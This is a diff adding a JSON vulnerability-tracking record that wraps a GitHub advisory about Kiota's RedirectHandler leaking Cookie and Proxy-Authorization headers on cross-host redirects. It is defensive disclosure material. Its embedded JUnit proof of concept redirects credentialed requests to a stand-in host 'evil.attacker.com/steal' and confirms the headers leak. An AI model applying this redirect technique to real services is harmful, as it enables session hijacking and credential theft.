@@ -1,0 +1,65 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/8527305?v=4\", \"events_url\": \"https://api.github.com/users/MIchaelMainer/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/MIchaelMainer/followers\", \"following_url\": \"https://api.github.com/users/MIchaelMainer/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/MIchaelMainer/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/MIchaelMainer\", \"id\": 8527305, \"login\": \"MIchaelMainer\", \"node_id\": \"MDQ6VXNlcjg1MjczMDU=\", \"organizations_url\": \"https://api.github.com/users/MIchaelMainer/orgs\", \"received_events_url\": \"https://api.github.com/users/MIchaelMainer/received_events\", \"repos_url\": \"https://api.github.com/users/MIchaelMainer/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/MIchaelMainer/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/MIchaelMainer/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/MIchaelMainer\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-44503\", \"cvss\": {\"score\": null, \"vector_string\": null}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 0.0, \"vector_string\": null}, \"cvss_v4\": {\"score\": 7.0, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N\"}}, \"cwes\": [{\"cwe_id\": \"CWE-601\", \"name\": \"URL Redirection to Untrusted Site ('Open Redirect')\"}], \"description\": \"### Summary\\nThe RedirectHandler middleware in microsoft/kiota-java (com.microsoft.kiota:microsoft-kiota-http-okHttp v1.9.0) and other Kiota libraries fails to strip sensitive HTTP headers when following 3xx redirects to a different host or scheme. \\n\\nThis vulnerability is present in the RedirectHandlers for:\\n\\nhttps://github.com/microsoft/kiota-dotnet\\nhttps://github.com/microsoft/kiota-java\\nhttps://github.com/microsoft/kiota-python\\nhttps://github.com/microsoft/kiota-typescript\\nhttps://github.com/microsoft/kiota-http-go\\n\\n\\n### Details\\nOnly the Authorization header is removed; Cookie, Proxy-Authorization, and all custom headers are forwarded to the redirect target.\\n\\nThis is the default middleware in every kiota-java HTTP client created via KiotaClientFactory.create(). OkHttp's built-in redirect handler (which handles this correctly) is explicitly disabled at line 63 of KiotaClientFactory.java in favor of kiota's broken implementation.\\n\\nVulnerable code in RedirectHandler.java lines 107-116 (getRedirect method) in versions 1.90 and earlier:\\n\\n```\\nboolean sameScheme = locationUrl.scheme().equalsIgnoreCase(requestUrl.scheme());\\nboolean sameHost = locationUrl.host().toString().equalsIgnoreCase(requestUrl.host().toString());\\nif (!sameScheme || !sameHost) {\\nrequestBuilder.removeHeader(\\\"Authorization\\\");\\n// BUG: Cookie, Proxy-Authorization, and all other headers are NOT removed\\n}\\n```\\n\\n\\n### PoC\\n1. Clone the repository:\\ngit clone --depth 1 https://github.com/microsoft/kiota-java.git\\ncd kiota-java\\n\\n2. Create the PoC test file at:\\ncomponents/http/okHttp/src/test/java/com/microsoft/kiota/http/middleware/SecurityPoC.java\\n\\nWith this content:\\n```\\npackage com.microsoft.kiota.http.middleware;\\nimport static org.junit.jupiter.api.Assertions.*;\\nimport com.microsoft.kiota.http.KiotaClientFactory;\\nimport okhttp3.*;\\nimport okhttp3.mockwebserver.*;\\nimport org.junit.jupiter.api.Test;\\n\\npublic class SecurityPoC {\\n@Test\\nvoid crossHostRedirectLeaksCookies() throws Exception {\\nRequest original = new Request.Builder()\\n.url(\\\"http://trusted.example.com/api\\\")\\n.addHeader(\\\"Authorization\\\", \\\"Bearer token\\\")\\n.addHeader(\\\"Cookie\\\", \\\"session=SECRET\\\")\\n.addHeader(\\\"Proxy-Authorization\\\", \\\"Basic cHJveHk6cGFzcw==\\\")\\n.build();\\nResponse redirect = new Response.Builder()\\n.request(original).protocol(Protocol.HTTP_1_1)\\n.code(302).message(\\\"Found\\\")\\n.header(\\\"Location\\\", \\\"http://evil.attacker.com/steal\\\")\\n.body(ResponseBody.create(\\\"\\\", MediaType.parse(\\\"text/plain\\\")))\\n.build();\\nRequest result = new RedirectHandler().getRedirect(original, redirect);\\nassertNotNull(result);\\nassertEquals(\\\"evil.attacker.com\\\", result.url().host());\\nassertNull(result.header(\\\"Authorization\\\")); // stripped (good)\\nassertEquals(\\\"session=SECRET\\\", result.header(\\\"Cookie\\\")); // LEAKED\\nassertEquals(\\\"Basic cHJveHk6cGFzcw==\\\", result.header(\\\"Proxy-Authorization\\\")); // LEAKED\\n}\\n\\n@Test\\nvoid endToEndProof() throws Exception {\\nvar evil = new MockWebServer();\\nevil.start();\\nevil.enqueue(new MockResponse().setResponseCode(200));\\nvar trusted = new MockWebServer();\\ntrusted.start();\\ntrusted.enqueue(new MockResponse().setResponseCode(302)\\n.setHeader(\\\"Location\\\", evil.url(\\\"/steal\\\")));\\nOkHttpClient client = KiotaClientFactory.create(\\nnew Interceptor[]{new RedirectHandler()}).build();\\nclient.newCall(new Request.Builder().url(trusted.url(\\\"/api\\\"))\\n.addHeader(\\\"Cookie\\\", \\\"session=SECRET\\\").build()).execute();\\ntrusted.takeRequest();\\nRecordedRequest captured = evil.takeRequest();\\nassertEquals(\\\"session=SECRET\\\", captured.getHeader(\\\"Cookie\\\")); // LEAKED to evil server\\nevil.shutdown();\\ntrusted.shutdown();\\n}\\n}\\n```\\n\\n3. Run the tests:\\n./gradlew :components:http:okHttp:test --tests \\\"com.microsoft.kiota.http.middleware.SecurityPoC\\\"\\n\\n4. Result: BUILD SUCCESSFUL, 2 tests passed, 0 failures.\\nBoth tests confirm Cookie and Proxy-Authorization headers are sent to the attacker's server on cross-host redirect.\\n\\n### Impact\\nThe kiota-java bug is more severe because it leaks ALL sensitive headers simultaneously (Cookie + Proxy-Authorization + custom auth headers), not just one type.\\n\\nAttack scenario: An attacker who can trigger a cross-origin redirect from a trusted API (via open redirect, MITM, or DNS rebinding) captures the victim's session cookies, proxy credentials, and API keys from the redirected request.\\n\\nImpact:\\n- Session hijacking via leaked Cookie headers\\n- Corporate proxy credential theft via leaked Proxy-Authorization\\n- API key theft via leaked custom auth headers (X-API-Key, etc.)\\n\\nAll consumers of kiota-java are affected, including Microsoft Graph SDK for Java.\", \"epss\": {\"percentage\": 0.00505, \"percentile\": 0.3954}, \"ghsa_id\": \"GHSA-7j59-v9qr-6fq9\", \"github_reviewed_at\": \"2026-05-07T01:49:01Z\", \"html_url\": \"https://github.com/advisories/GHSA-7j59-v9qr-6fq9\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-7j59-v9qr-6fq9\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-44503\"}], \"nvd_published_at\": \"2026-05-14T16:16:24Z\", \"published_at\": \"2026-05-07T01:49:01Z\", \"references\": [\"https://github.com/microsoft/kiota-java/security/advisories/GHSA-7j59-v9qr-6fq9\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-44503\", \"https://github.com/advisories/GHSA-7j59-v9qr-6fq9\"], \"repository_advisory_url\": \"https://api.github.com/repos/microsoft/kiota-java/security-advisories/GHSA-7j59-v9qr-6fq9\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/microsoft/kiota-java\", \"summary\": \"Kiota abstractions RedirectHandler leaks Cookie/Proxy-Authorization headers on cross-host redirect\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-14T20:53:18Z\", \"url\": \"https://api.github.com/advisories/GHSA-7j59-v9qr-6fq9\", \"vulnerabilities\": [{\"first_patched_version\": \"1.9.1\", \"package\": {\"ecosystem\": \"maven\", \"name\": \"com.microsoft.kiota:microsoft-kiota-abstractions\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 1.9.1\"}, {\"first_patched_version\": \"1.22.0\", \"package\": {\"ecosystem\": \"nuget\", \"name\": \"Microsoft.Kiota.Abstractions\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 1.22.0\"}, {\"first_patched_version\": \"1.9.9\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"microsoft-kiota-http\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 1.9.9\"}, {\"first_patched_version\": \"1.0.0-preview.100\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"kiota-typescript\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 1.0.0-preview.100\"}, {\"first_patched_version\": \"1.5.5\", \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/microsoft/kiota-http-go\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 1.5.5\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-7j59-v9qr-6fq9",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "Microsoft.Kiota.Abstractions: < 1.22.0",
+      "com.microsoft.kiota:microsoft-kiota-abstractions: < 1.9.1",
+      "github.com/microsoft/kiota-http-go: < 1.5.5",
+      "kiota-typescript: < 1.0.0-preview.100",
+      "microsoft-kiota-http: < 1.9.9"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-44503"
+    ],
+    "cvss_score": 7.0,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "Microsoft.Kiota.Abstractions",
+      "com.microsoft.kiota:microsoft-kiota-abstractions",
+      "github.com/microsoft/kiota-http-go",
+      "kiota-typescript",
+      "microsoft-kiota-http"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:52:02.195964Z",
+  "provenance": {
+    "content_sha256": "f5360e3c77b13391cc39b80aeb7807521eff75644aa0ec38264ee33ce34dce7d",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-07T01:49:01Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-7j59-v9qr-6fq9",
+  "status": "active",
+  "title": "Kiota abstractions RedirectHandler leaks Cookie/Proxy-Authorization headers on cross-host redirect",
+  "updated_at": "2026-05-14T20:53:18Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-7j59-v9qr-6fq9"
+}
